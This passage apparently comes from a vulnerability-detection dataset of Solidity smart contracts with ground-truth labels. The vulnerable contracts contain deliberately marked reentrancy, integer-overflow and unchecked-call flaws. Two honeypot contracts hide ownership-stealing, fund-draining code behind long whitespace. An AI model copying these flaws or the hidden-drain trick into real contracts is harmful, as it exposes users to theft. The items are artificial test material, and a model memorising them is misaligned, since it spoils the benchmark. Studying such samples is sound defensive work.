function createGen0Auction(uint256 _pandaId) external onlyCOO {\n        require(_owns(msg.sender, _pandaId));\n        //require(pandas[_pandaId].generation==1);\n\n        _approve(_pandaId, saleAuction);\n\n        saleAuction.createGen0Auction(\n            _pandaId,\n            _computeNextGen0Price(),\n            0,\n            GEN0_AUCTION_DURATION,\n            msg.sender\n        );\n    }\n\n    /// @dev Computes the next gen0 auction starting price, given\n    ///  the average of the past 5 prices + 50%.\n    function _computeNextGen0Price() internal view returns(uint256) {\n        uint256 avePrice = saleAuction.averageGen0SalePrice();\n\n        // Sanity check to ensure we don't overflow arithmetic\n        require(avePrice == uint256(uint128(avePrice)));\n\n        uint256 nextPrice = avePrice + (avePrice / 2);\n\n        // We never auction for less than starting price\n        if (nextPrice < GEN0_STARTING_PRICE) {\n            nextPrice = GEN0_STARTING_PRICE;\n        }\n\n        return nextPrice;\n    }\n}\n\n\n\n/// @title CryptoPandas: Collectible, breedable, and oh-so-adorable cats on the Ethereum blockchain.\n/// @author Axiom Zen (https://www.axiomzen.co)\n/// @dev The main CryptoPandas contract, keeps track of kittens so they don't wander around and get lost.\ncontract PandaCore is PandaMinting {\n\n    // This is the main CryptoPandas contract. In order to keep our code seperated into logical sections,\n    // we've broken it up in two ways. First, we have several seperately-instantiated sibling contracts\n    // that handle auctions and our super-top-secret genetic combination algorithm. The auctions are\n    // seperate since their logic is somewhat complex and there's always a risk of subtle bugs. By keeping\n    // them in their own contracts, we can upgrade them without disrupting the main contract that tracks\n    // panda ownership. The genetic combination algorithm is kept seperate so we can open-source all of\n    // the rest of our code without making it _too_ easy for folks to figure out how the genetics work.\n    // Don't worry, I'm sure someone will reverse engineer it soon enough!\n    //\n    // Secondly, we break the core contract into multiple files using inheritence, one for each major\n    // facet of functionality of CK. This allows us to keep related code bundled together while still\n    // avoiding a single giant file with everything in it. The breakdown is as follows:\n    //\n    //      - PandaBase: This is where we define the most fundamental code shared throughout the core\n    //             functionality. This includes our main data storage, constants and data types, plus\n    //             internal functions for managing these items.\n    //\n    //      - PandaAccessControl: This contract manages the various addresses and constraints for operations\n    //             that can be executed only by specific roles. Namely CEO, CFO and COO.\n    //\n    //      - PandaOwnership: This provides the methods required for basic non-fungible token\n    //             transactions, following the draft ERC-721 spec (https://github.com/ethereum/EIPs/issues/721).\n    //\n    //      - PandaBreeding: This file contains the methods necessary to breed cats together, including\n    //             keeping track of siring offers, and relies on an external genetic combination contract.\n    //\n    //      - PandaAuctions: Here we have the public methods for auctioning or bidding on cats or siring\n    //             services. The actual auction functionality is handled in two sibling contracts (one\n    //             for sales and one for siring), while auction creation and bidding is mostly mediated\n    //             through this facet of the core contract.\n    //\n    //      - PandaMinting: This final facet contains the functionality we use for creating new gen0 cats.\n    //             the community is new), and all others can only be created and then immediately put up\n    //             for auction via an algorithmically determined starting price. Regardless of how they\n    //             are created, there is a hard limit of 50k gen0 cats. After that, it's all up to the\n    //             community to breed, breed, breed!\n\n    // Set in case the core contract is broken and an upgrade is required\n    address public newContractAddress;\n\n\n    /// @notice Creates the main CryptoPandas smart contract instance.\n    function PandaCore() public {\n        // Starts paused.\n        paused = true;\n\n        // the creator of the contract is the initial CEO\n        ceoAddress = msg.sender;\n\n        // the creator of the contract is also the initial COO\n        cooAddress = msg.sender;\n\n        // move these code to init(), so we not excceed gas limit\n        //uint256[2] memory _genes = [uint256(-1),uint256(-1)];\n\n        //wizzPandaQuota[1] = 100;\n\n        //_createPanda(0, 0, 0, _genes, address(0));\n    }\n\n    /// init contract\n    function init() external onlyCEO whenPaused {\n        // make sure init() only run once\n        require(pandas.length == 0);\n        // start with the mythical kitten 0 - so we don't have generation-0 parent issues\n        uint256[2] memory _genes = [uint256(-1),uint256(-1)];\n\n        wizzPandaQuota[1] = 100;\n       _createPanda(0, 0, 0, _genes, address(0));\n    }\n\n    /// @dev Used to mark the smart contract as upgraded, in case there is a serious\n    ///  breaking bug. This method does nothing but keep track of the new contract and\n    ///  emit a message indicating that the new address is set. It's up to clients of this\n    ///  contract to update to the new contract address in that case. (This contract will\n    ///  be paused indefinitely if such an upgrade takes place.)\n    /// @param _v2Address new address\n    function setNewAddress(address _v2Address) external onlyCEO whenPaused {\n        // See README.md for updgrade plan\n        newContractAddress = _v2Address;\n        ContractUpgrade(_v2Address);\n    }\n    \n\n    /// @notice No tipping!\n    /// @dev Reject all Ether from being sent here, unless it's from one of the\n    ///  two auction contracts. (Hopefully, we can prevent user accidents.)\n    function() external payable {\n        require(\n            msg.sender == address(saleAuction) ||\n            msg.sender == address(siringAuction)\n        );\n    }\n\n    /// @notice Returns all the relevant information about a specific panda.\n    /// @param _id The ID of the panda of interest.\n    function getPanda(uint256 _id)\n        external\n        view\n        returns (\n        bool isGestating,\n        bool isReady,\n        uint256 cooldownIndex,\n        uint256 nextActionAt,\n        uint256 siringWithId,\n        uint256 birthTime,\n        uint256 matronId,\n        uint256 sireId,\n        uint256 generation,\n        uint256[2] genes\n    ) {\n        Panda storage kit = pandas[_id];\n\n        // if this variable is 0 then it's not gestating\n        isGestating = (kit.siringWithId != 0);\n        isReady = (kit.cooldownEndBlock <= block.number);\n        cooldownIndex = uint256(kit.cooldownIndex);\n        nextActionAt = uint256(kit.cooldownEndBlock);\n        siringWithId = uint256(kit.siringWithId);\n        birthTime = uint256(kit.birthTime);\n        matronId = uint256(kit.matronId);\n        sireId = uint256(kit.sireId);\n        generation = uint256(kit.generation);\n        genes = kit.genes;\n    }\n\n    /// @dev Override unpause so it requires all external contract addresses\n    ///  to be set before contract can be unpaused. Also, we can't have\n    ///  newContractAddress set either, because then the contract was upgraded.\n    /// @notice This is public rather than external so we can call super.unpause\n    ///  without using an expensive CALL.\n    function unpause() public onlyCEO whenPaused {\n        require(saleAuction != address(0));\n        require(siringAuction != address(0));\n        require(geneScience != address(0));\n        require(newContractAddress == address(0));\n\n        // Actually unpause the contract.\n        super.unpause();\n    }\n\n    // @dev Allows the CFO to capture the balance available to the contract.\n    function withdrawBalance() external onlyCFO {\n        uint256 balance = this.balance;\n        // Subtract all the currently pregnant kittens we have, plus 1 of margin.\n        uint256 subtractFees = (pregnantPandas + 1) * autoBirthFee;\n\n        if (balance > subtractFees) {\n             // <yes> <report> UNCHECKED_LL_CALLS\n            cfoAddress.send(balance - subtractFees);\n        }\n    }\n}",
    "num_lines": 2470,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xd5967fed03e85d1cce44cab284695b41bc675b5c",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n \ncontract demo{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
    "num_lines": 20,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "integer_overflow_add",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/integer_overflow_add.sol",
    "contract_code": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite/blob/master/benchmarks/integer_overflow_add.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowAdd {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count += input;\n    }\n}\n",
    "num_lines": 20,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x610495793564aed0f9c7fc48dc4c7c9151d34fd6",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x610495793564aed0f9c7fc48dc4c7c9151d34fd6.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 33\n */\n\npragma solidity ^0.4.24;\n\n\ncontract SimpleWallet {\n    address public owner = msg.sender;\n    uint public depositsCount;\n    \n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n    \n    function() public payable {\n        depositsCount++;\n    }\n    \n    function withdrawAll() public onlyOwner {\n        withdraw(address(this).balance);\n    }\n    \n    function withdraw(uint _value) public onlyOwner {\n        msg.sender.transfer(_value);\n    }\n    \n    function sendMoney(address _target, uint _value, bytes _data) public onlyOwner {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        _target.call.value(_value)(_data);\n    }\n}",
    "num_lines": 35,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "overflow_simple_add",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/overflow_simple_add.sol",
    "contract_code": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101#overflow-simple-addsol\n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity 0.4.25;\n\ncontract Overflow_Add {\n    uint public balance = 1;\n\n    function add(uint256 deposit) public {\n        // <yes> <report> ARITHMETIC\n        balance += deposit;\n    }\n}\n",
    "num_lines": 17,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "integer_overflow_1",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/integer_overflow_1.sol",
    "contract_code": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/integer_overflow/integer_overflow_1.sol\n * @author: -\n * @vulnerable_at_lines: 14\n */\n\n pragma solidity ^0.4.15;\n\n contract Overflow {\n     uint private sellerBalance=0;\n\n     function add(uint value) returns (bool){\n         // <yes> <report> ARITHMETIC\n         sellerBalance += value; // possible overflow\n\n         // possible auditor assert\n         // assert(sellerBalance >= value);\n     }\n\n  // function safe_add(uint value) returns (bool){\n  //   require(value + sellerBalance >= sellerBalance);\n  // sellerBalance += value;\n  // } \n }\n",
    "num_lines": 25,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xcead721ef5b11f1a7b530171aab69b16c5e66b6e",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0xcead721ef5b11f1a7b530171aab69b16c5e66b6e.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 85,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "integer_overflow_mul",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/integer_overflow_mul.sol",
    "contract_code": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mul.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowMul {\n    uint public count = 2;\n\n    function run(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count *= input;\n    }\n}\n",
    "num_lines": 20,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC7786Recipient",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/crosschain/ERC7786Recipient.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (crosschain/ERC7786Recipient.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC7786Recipient} from \"../interfaces/draft-IERC7786.sol\";\nimport {BitMaps} from \"../utils/structs/BitMaps.sol\";\n\n/**\n * @dev Base implementation of an ERC-7786 compliant cross-chain message receiver.\n *\n * This abstract contract exposes the `receiveMessage` function that is used for communication with (one or multiple)\n * destination gateways. This contract leaves two functions unimplemented:\n *\n * * {_isAuthorizedGateway}, an internal getter used to verify whether an address is recognised by the contract as a\n * valid ERC-7786 destination gateway. One or multiple gateway can be supported. Note that any malicious address for\n * which this function returns true would be able to impersonate any account on any other chain sending any message.\n *\n * * {_processMessage}, the internal function that will be called with any message that has been validated.\n *\n * This contract implements replay protection, meaning that if two messages are received from the same gateway with the\n * same `receiveId`, then the second one will NOT be executed, regardless of the result of {_isAuthorizedGateway}.\n */\nabstract contract ERC7786Recipient is IERC7786Recipient {\n    using BitMaps for BitMaps.BitMap;\n\n    mapping(address gateway => BitMaps.BitMap) private _received;\n\n    error ERC7786RecipientUnauthorizedGateway(address gateway, bytes sender);\n    error ERC7786RecipientMessageAlreadyProcessed(address gateway, bytes32 receiveId);\n\n    /// @inheritdoc IERC7786Recipient\n    function receiveMessage(\n        bytes32 receiveId,\n        bytes calldata sender, // Binary Interoperable Address\n        bytes calldata payload\n    ) external payable returns (bytes4) {\n        // Check authorization\n        if (!_isAuthorizedGateway(msg.sender, sender)) {\n            revert ERC7786RecipientUnauthorizedGateway(msg.sender, sender);\n        }\n\n        // Prevent duplicate execution\n        if (_received[msg.sender].get(uint256(receiveId))) {\n            revert ERC7786RecipientMessageAlreadyProcessed(msg.sender, receiveId);\n        }\n        _received[msg.sender].set(uint256(receiveId));\n\n        _processMessage(msg.sender, receiveId, sender, payload);\n\n        return IERC7786Recipient.receiveMessage.selector;\n    }\n\n    /**\n     * @dev Virtual getter that returns whether an address is a valid ERC-7786 gateway for a given sender.\n     *\n     * The `sender` parameter is an interoperable address that include the source chain. The chain part can be\n     * extracted using the {InteroperableAddress} library to selectively authorize gateways based on the origin chain\n     * of a message.\n     */\n    function _isAuthorizedGateway(address gateway, bytes calldata sender) internal view virtual returns (bool);\n\n    /// @dev Virtual function that should contain the logic to execute when a cross-chain message is received.\n    function _processMessage(\n        address gateway,\n        bytes32 receiveId,\n        bytes calldata sender,\n        bytes calldata payload\n    ) internal virtual;\n}\n",
    "num_lines": 71,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "Proxy",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/proxy/Proxy.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (proxy/Proxy.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM\n * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to\n * be specified by overriding the virtual {_implementation} function.\n *\n * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a\n * different contract through the {_delegate} function.\n *\n * The success and return data of the delegated call will be returned back to the caller of the proxy.\n */\nabstract contract Proxy {\n    /**\n     * @dev Delegates the current call to `implementation`.\n     *\n     * This function does not return to its internal call site, it will return directly to the external caller.\n     */\n    function _delegate(address implementation) internal virtual {\n        assembly {\n            // Copy msg.data. We take full control of memory in this inline assembly\n            // block because it will not return to Solidity code. We overwrite the\n            // Solidity scratch pad at memory position 0.\n            calldatacopy(0x00, 0x00, calldatasize())\n\n            // Call the implementation.\n            // out and outsize are 0 because we don't know the size yet.\n            let result := delegatecall(gas(), implementation, 0x00, calldatasize(), 0x00, 0x00)\n\n            // Copy the returned data.\n            returndatacopy(0x00, 0x00, returndatasize())\n\n            switch result\n            // delegatecall returns 0 on error.\n            case 0 {\n                revert(0x00, returndatasize())\n            }\n            default {\n                return(0x00, returndatasize())\n            }\n        }\n    }\n\n    /**\n     * @dev This is a virtual function that should be overridden so it returns the address to which the fallback\n     * function and {_fallback} should delegate.\n     */\n    function _implementation() internal view virtual returns (address);\n\n    /**\n     * @dev Delegates the current call to the address returned by `_implementation()`.\n     *\n     * This function does not return to its internal call site, it will return directly to the external caller.\n     */\n    function _fallback() internal virtual {\n        _delegate(_implementation());\n    }\n\n    /**\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other\n     * function in the contract matches the call data.\n     */\n    fallback() external payable virtual {\n        _fallback();\n    }\n}\n",
    "num_lines": 70,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0xd2018bfaa266a9ec0a1a84b061640faa009def76",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Pie\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function Get()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 46,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 63\n */\n\npragma solidity ^0.4.19;\n\ncontract MONEY_BOX   \n{\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n    \n    mapping (address => Holder) public Acc;\n    \n    uint public MinSum;\n    \n    Log LogFile;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        LogFile = Log(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Put(uint _lockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n    \n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 104,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "tokensalechallenge",
    "contract_path": "data/raw/smartbugs-curated/dataset/arithmetic/tokensalechallenge.sol",
    "contract_code": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101 // https://capturetheether.com/challenges/math/token-sale/\n * @author: Steve Marx\n * @vulnerable_at_lines: 23,25,33\n */\n\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge {\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance < 1 ether;\n    }\n\n    function buy(uint256 numTokens) public payable {\n        // <yes> <report> ARITHMETIC\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n        // <yes> <report> ARITHMETIC\n        balanceOf[msg.sender] += numTokens;\n    }\n\n    function sell(uint256 numTokens) public {\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n        // <yes> <report> ARITHMETIC\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    }\n}\n",
    "num_lines": 36,
    "vulnerability_type": "integer_overflow",
    "ground_truth_vulnerabilities": [
      "integer_overflow"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC721Burnable",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC721/extensions/ERC721Burnable.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.5.0) (token/ERC721/extensions/ERC721Burnable.sol)\n\npragma solidity ^0.8.24;\n\nimport {ERC721} from \"../ERC721.sol\";\nimport {Context} from \"../../../utils/Context.sol\";\n\n/**\n * @title ERC-721 Burnable Token\n * @dev ERC-721 Token that can be burned (destroyed).\n */\nabstract contract ERC721Burnable is Context, ERC721 {\n    /**\n     * @dev Burns `tokenId`. See {ERC721-_burn}.\n     *\n     * Requirements:\n     *\n     * - The caller must own `tokenId` or be an approved operator.\n     */\n    function burn(uint256 tokenId) public virtual {\n        // Setting an \"auth\" arguments enables the `_isAuthorized` check which verifies that the token exists\n        // (from != 0). Therefore, it is not needed to verify that the return value is not 0 here.\n        _update(address(0), tokenId, _msgSender());\n    }\n}\n",
    "num_lines": 27,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0xa1fceeff3acc57d257b917e30c4df661401d6431",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xa1fceeff3acc57d257b917e30c4df661401d6431.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 31\n */\n\npragma solidity ^0.4.18;\n\ncontract AirDropContract{\n\n    function AirDropContract() public {\n    }\n\n    modifier validAddress( address addr ) {\n        require(addr != address(0x0));\n        require(addr != address(this));\n        _;\n    }\n    \n    function transfer(address contract_address,address[] tos,uint[] vs)\n        public \n        validAddress(contract_address)\n        returns (bool){\n\n        require(tos.length > 0);\n        require(vs.length > 0);\n        require(tos.length == vs.length);\n        bytes4 id = bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i = 0 ; i < tos.length; i++){\n            // <yes> <report> UNCHECKED_LL_CALLS\n            contract_address.call(id, msg.sender, tos[i], vs[i]);\n        }\n        return true;\n    }\n}",
    "num_lines": 35,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 45\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway1\n{\n    address public Owner = msg.sender;\n    uint constant public minEligibility = 0.999001 ether; \n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function redeem()\n    public\n    payable\n    {                                                                    \n        if(msg.value>=minEligibility)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        // <yes> <report> UNCHECKED_LL_CALLS\n        adr.call.value(msg.value)(data);\n    }\n}",
    "num_lines": 47,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "ERC1363",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC1363.sol",
